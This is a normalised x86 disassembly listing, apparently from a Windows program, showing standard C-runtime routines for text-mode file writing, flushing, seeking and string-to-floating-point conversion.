mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_43467d
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_436d8a
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_436f66
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_436f66
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_436d8a
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_42cfe4
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c8b1
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42d0b6
mov eax [ ebp - 0x1c ]
sub_42d0c0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_42c50d
pop ecx
push eax
call sub_42cfe4
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_42d128
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_42d0c0
pop ecx
test eax eax
je r-xdata
push esi
call sub_42d170
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_42c50d
push eax
call sub_436fab
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_42d170
push 0x14
push r--data
call sub_42b398
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42d241
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_42b3dd
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_42b732
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_42d212
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_42d128
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_42d128
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_42d253
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43674e
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_425eb1
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_425ed7
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_42d2c8
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42d253
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42d39a
mov eax [ ebp - 0x1c ]
sub_42d3a4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_42c50d
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
push 0x1
push ebx
push eax
call sub_42d2c8
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_425eb1
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_42d2c8
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_42d2c8
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_42d541
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_42d6a0
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43708c
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_42d5e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_423619
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_434645
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_430a86
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42d6a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_42dd68 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_437b14
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
